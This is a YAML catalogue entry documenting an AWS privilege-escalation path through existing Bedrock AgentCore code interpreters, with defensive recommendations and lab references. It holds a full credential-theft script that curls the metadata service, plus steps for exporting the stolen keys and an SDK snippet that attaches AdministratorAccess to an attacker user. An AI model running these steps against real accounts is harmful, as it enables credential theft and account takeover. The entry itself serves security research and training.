id: bedrock-002
name: bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter
category: existing-passrole
services:
- bedrock-agentcore
description: A principal with `bedrock-agentcore:StartCodeInterpreterSession` and
  `bedrock-agentcore:InvokeCodeInterpreter` can access an existing Bedrock AgentCore
  code interpreter that has a privileged IAM execution role attached. By starting
  a session and invoking arbitrary Python code within the interpreter, an attacker
  can access the MicroVM Metadata Service (MMDS) at 169.254.169.254 to retrieve temporary
  credentials for the interpreter's execution role. This path doesn't require `iam:PassRole`
  since the role is already attached to the existing interpreter. Similar to `lambda:UpdateFunctionCode`,
  this targets existing resources rather than creating new ones.
prerequisites:
  admin:
  - A Bedrock AgentCore code interpreter must exist with an IAM execution role attached
  - The interpreter's role must have administrative permissions (e.g., AdministratorAccess
    or an equivalent custom policy)
  - The interpreter must be in a running or ready state
  lateral:
  - A Bedrock AgentCore code interpreter must exist with an IAM execution role attached
  - The interpreter must be in a running or ready state
exploitationSteps:
  awscli:
  - step: 1
    command: aws bedrock-agentcore-control list-code-interpreters
    description: List existing code interpreters to find targets with privileged roles
  - step: 2
    command: aws bedrock-agentcore-control get-code-interpreter --code-interpreter-id
      INTERPRETER_ID
    description: Check the interpreter's execution role ARN to confirm elevated permissions
  - step: 3
    command: "cat << 'EOF' > \"get_secrets_from_interpreter.py\"\nimport boto3\nimport\
      \ sys\nbedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])\n\
      CODE_INTERPRETER_ID = sys.argv[1]\n\nsession = bedrock_agentcore_client.start_code_interpreter_session(\n\
      \  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n)\nsession_id = session['sessionId']\n\
      \ncode = 'IP=\"169.254.169.254\"; METADATA=\"meta-data\"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'\n\
      \nresponse = bedrock_agentcore_client.invoke_code_interpreter(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n\
      \  sessionId=session_id,\n  name='executeCommand',\n  arguments={'command':\
      \ code}\n)\n\nfor event in response['stream']:\n  if event['result']['structuredContent']['stdout']:\n\
      \    print(event['result']['structuredContent']['stdout'])\nEOF\n"
    description: Create the python file that will invoke the existing interpreter
  - step: 4
    command: 'CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)

      echo export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r ".AccessKeyId")

      echo export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r ".SecretAccessKey")

      echo export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r ".Token")

      '
    description: Run the python file using the $INTERPRETER_ID to extract credentials
  - step: 5
    command: 'export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>

      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>

      export AWS_SESSION_TOKEN=<Token from step 5>

      aws sts get-caller-identity

      '
    description: Use the stolen credentials to assume the privileged role's permissions
recommendation: "Restrict the `bedrock-agentcore:StartCodeInterpreterSession` and\
  \ `bedrock-agentcore:InvokeCodeInterpreter`\npermissions using resource-based constraints.\n\
  \n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\n    \"bedrock-agentcore:StartCodeInterpreterSession\"\
  ,\n    \"bedrock-agentcore:InvokeCodeInterpreter\"\n  ],\n  \"Resource\": \"arn:aws:bedrock-agentcore:REGION:ACCOUNT_ID:code-interpreter/SpecificInterpreter\"\
  \n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `StartCodeInterpreterSession`\
  \ and `InvokeCodeInterpreter` events on sensitive code interpreters\n- Alert on\
  \ session creation for interpreters with administrative roles\n- Implement resource\
  \ tags and condition keys to restrict code interpreter usage\n- Regularly audit\
  \ execution roles attached to code interpreters\n- Use SCPs to restrict access to\
  \ sensitive interpreters\n- Enable CloudTrail Data Event logging for code interpreter\
  \ invocations\n- Implement network isolation for code interpreters processing sensitive\
  \ data\n- Review and minimize execution role permissions on existing interpreters\n"
limitations: 'This path provides administrative access only if the target resource''s
  execution role has administrative permissions. The attacker gains whatever permissions
  the resource''s role has. If the role has limited permissions, the attacker gains
  limited access. However, even limited access may enable multi-hop attacks or access
  to sensitive data.

  '
discoveryAttribution:
  firstDocumented:
    author: Nigel Sood
    organization: Sonrai Security
    date: 2025
    link: https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/
  derivativeOf:
    pathId: bedrock-001
    modification: Targets existing code interpreters instead of creating new ones,
      eliminating the need for iam:PassRole and bedrock-agentcore:CreateCodeInterpreter
      permissions
references:
- title: 'AWS AgentCore: The Overlooked Privilege Escalation Path in Bedrock AI Tooling'
  url: https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/
- title: 'Sandboxed to Compromised: New Research Exposes Credential Exfiltration Paths
    in AWS Code Interpreters'
  url: https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/
- title: Understanding Credentials Management in Amazon Bedrock AgentCore
  url: https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html
relatedPaths:
- bedrock-001
- lambda-003
- glue-002
- ec2-002
permissions:
  required:
  - permission: bedrock-agentcore:StartCodeInterpreterSession
    resourceConstraints: Target code interpreter must be in the Resource section
  - permission: bedrock-agentcore:InvokeCodeInterpreter
    resourceConstraints: Target code interpreter must be in the Resource section
  additional:
  - permission: bedrock-agentcore:ListCodeInterpreters
    resourceConstraints: List the interpreters that already exist
  - permission: bedrock-agentcore:GetCodeInterpreter
    resourceConstraints: Identify the role associated with the session
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: 'The principal with bedrock-agentcore:StartCodeInterpreterSession
      and bedrock-agentcore:InvokeCodeInterpreter permissions. Can be an IAM user
      or role. This attack targets an existing code interpreter rather than creating
      a new one, so iam:PassRole is not required.

      '
  - id: code_interpreter
    label: Existing Code Interpreter
    type: resource
    description: 'An existing Bedrock AgentCore code interpreter with a privileged
      execution role already attached. The interpreter runs on a Firecracker MicroVM
      and has access to the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar
      to EC2''s IMDS.

      '
  - id: execution_role
    label: Code Interpreter Execution Role
    type: principal
    description: 'The IAM role attached to the code interpreter as its execution role.
      When code is executed in the interpreter, it automatically runs with this role''s
      permissions. The role''s temporary credentials are available through the MicroVM
      Metadata Service (MMDS) at 169.254.169.254, similar to how EC2 instances access
      IMDS. This role must trust bedrock.amazonaws.com in its trust policy.

      '
  - id: method_sdk_attack
    label: 'Method 1: Execute Attack via AWS SDK'
    type: payload
    color: '#99ccff'
    description: "The malicious code interpreter code uses the AWS SDK within the\
      \ Python execution environment to directly perform privileged actions using\
      \ the execution role's credentials. Since the code interpreter automatically\
      \ runs with the execution role's credentials available through the environment,\
      \ no credential exfiltration is needed.\n\nExample Python code invoked in the\
      \ interpreter:\n```python\nimport boto3\n\n# The interpreter automatically has\
      \ access to the execution role's credentials\niam = boto3.client('iam')\n\n\
      # Attach admin policy to starting user\niam.attach_user_policy(\n    UserName='attacker-user',\n\
      \    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n```\n\nThis\
      \ is the most direct approach - the code interpreter immediately modifies IAM\
      \ or performs other privileged actions using the execution role's permissions.\n"
  - id: method_cred_exfil
    label: 'Method 2: Exfiltrate Credentials to Output'
    type: payload
    color: '#99ccff'
    description: "Start a session with the existing code interpreter and invoke Python\
      \ code to query the MicroVM Metadata Service (MMDS) and retrieve the execution\
      \ role's temporary credentials. The credentials are returned in the code interpreter's\
      \ output and can be used from any location.\n\nExample Python script to exfiltrate\
      \ credentials:\n```python\nimport boto3\nimport sys\n\nbedrock_agentcore_client\
      \ = boto3.client('bedrock-agentcore', region_name=sys.argv[2])\nCODE_INTERPRETER_ID\
      \ = sys.argv[1]\n\n# Start a code interpreter session\nsession = bedrock_agentcore_client.start_code_interpreter_session(\n\
      \    codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n)\nsession_id = session['sessionId']\n\
      \n# Command to query MMDS for credentials\ncode = 'IP=\"169.254.169.254\"; METADATA=\"\
      meta-data\"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'\n\
      \n# Invoke the code interpreter to execute the command\nresponse = bedrock_agentcore_client.invoke_code_interpreter(\n\
      \    codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n    sessionId=session_id,\n\
      \    name='executeCommand',\n    arguments={'command': code}\n)\n\n# Extract\
      \ and print credentials from the output\nfor event in response['stream']:\n\
      \    if event['result']['structuredContent']['stdout']:\n        print(event['result']['structuredContent']['stdout'])\n\
      ```\n\nThis is similar to exfiltrating credentials from an EC2 instance via\
      \ IMDS, but targets the MicroVM's metadata service instead. This script retrieves\
      \ AccessKeyId, SecretAccessKey, and SessionToken from the MMDS and outputs them.\
      \ The attacker can then export these credentials and use them from any location\
      \ until they expire.\n"
  - id: admin
    label: Effective Administrator
    type: outcome
    description: 'The attacker successfully exfiltrated credentials from the code
      interpreter and the execution role has AdministratorAccess or equivalent permissions.
      The attacker now has full administrative access to the AWS account using the
      stolen credentials.

      '
  - id: some_perms
    label: Some additional access
    type: outcome
    color: '#ffeb99'
    description: 'The attacker successfully exfiltrated credentials from the code
      interpreter and the execution role has some elevated permissions (but not full
      admin). This could provide data access (S3, RDS, DynamoDB) or enable additional
      privilege escalation paths. The attacker should enumerate the role''s permissions
      to determine what additional access was gained.

      '
  - id: no_access
    label: No additional access
    type: outcome
    color: '#cccccc'
    description: 'The attacker successfully exfiltrated credentials from the code
      interpreter, but the execution role only has minimal permissions (e.g., logs:PutLogEvents).
      Limited usefulness for privilege escalation.

      '
  edges:
  - from: start
    to: code_interpreter
    label: Target existing code interpreter
    description: "Identify an existing code interpreter that has a privileged execution\
      \ role attached. Use bedrock-agentcore:ListCodeInterpreters to discover available\
      \ interpreters and bedrock-agentcore:GetCodeInterpreter to check their execution\
      \ role ARNs.\n\nCommands:\n```bash\n# List existing code interpreters\naws bedrock-agentcore-control\
      \ list-code-interpreters\n\n# Check execution role of specific interpreter\n\
      aws bedrock-agentcore-control get-code-interpreter \\\n  --code-interpreter-id\
      \ INTERPRETER_ID\n```\n"
  - from: code_interpreter
    to: execution_role
    label: bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter
    description: 'The attacker starts a session with the existing code interpreter
      and invokes Python code. The code executes within the Firecracker MicroVM with
      automatic access to the execution role''s credentials through the MicroVM Metadata
      Service (MMDS).


      Commands:

      ```bash

      # Create and run the credential extraction script

      python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION

      ```


      The Python script uses the bedrock-agentcore API to start a session and invoke
      arbitrary code within the interpreter.

      '
  - from: execution_role
    to: method_sdk_attack
    label: Option A
    branch: A
    description: 'The attacker designed the malicious Python code to use the AWS SDK
      to directly perform privileged actions. This is the most direct approach - the
      code interpreter immediately modifies IAM or performs other privileged actions
      using the execution role''s permissions.

      '
  - from: execution_role
    to: method_cred_exfil
    label: Option B
    branch: B
    description: 'The attacker designed the malicious Python code to query the MicroVM
      Metadata Service and exfiltrate the execution role''s credentials to the output.
      The attacker can then use these credentials from any location.

      '
  - from: method_sdk_attack
    to: admin
    label: If execution role has admin permissions
    branch: A1
    condition: admin
    description: 'If the code interpreter''s execution role has AdministratorAccess
      or equivalent permissions, the SDK attack directly grants the starting principal
      full administrative access by attaching admin policies or creating admin access
      keys.

      '
  - from: method_sdk_attack
    to: some_perms
    label: If execution role has some elevated permissions
    branch: A2
    condition: some_permissions
    description: 'If the execution role has some elevated permissions (data access,
      further escalation paths), the SDK attack can still grant useful additional
      permissions by modifying IAM within the role''s permission scope or accessing
      sensitive resources.

      '
  - from: method_sdk_attack
    to: no_access
    label: If execution role has minimal permissions
    branch: A3
    condition: no_permissions
    description: 'If the execution role only has minimal permissions (like logs:PutLogEvents),
      the SDK attack will fail to perform meaningful privilege escalation. The attacker
      would need to choose a different exploitation method or target a different code
      interpreter.

      '
  - from: method_cred_exfil
    to: admin
    label: If execution role has admin permissions
    branch: B1
    condition: admin
    description: 'If the code interpreter''s execution role has AdministratorAccess
      or equivalent permissions, the exfiltrated credentials provide the attacker
      with full administrative access to the AWS account from any location. The attacker
      can now perform any action in the AWS account.

      '
  - from: method_cred_exfil
    to: some_perms
    label: If execution role has some elevated permissions
    branch: B2
    condition: some_permissions
    description: 'If the execution role has some elevated permissions (data access,
      further escalation paths), the exfiltrated credentials can be used for lateral
      movement or additional attacks. The attacker should use `aws sts get-caller-identity`
      and enumerate permissions to determine what additional access was gained.

      '
  - from: method_cred_exfil
    to: no_access
    label: If execution role has minimal permissions
    branch: B3
    condition: no_permissions
    description: 'If the execution role only has minimal permissions (like logs:PutLogEvents
      or basic CloudWatch metrics), the exfiltrated credentials provide limited value
      for privilege escalation. The attacker may need to target a different code interpreter
      with a more privileged role.

      '
learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: privesc-one-hop/to-admin/bedrockagentcore-startsession+invoke
    description: Deploy Terraform into your own AWS account to practice this attack
      path
  cybr:
    type: closed-source
    description: Hosted learning environment with interactive AWS security labs
    scenario: https://cybr.com/hands-on-labs/lab/bedrock-agentcore-privilege-escalation-via-code-interpreters/
    scenarioPricingModel: paid
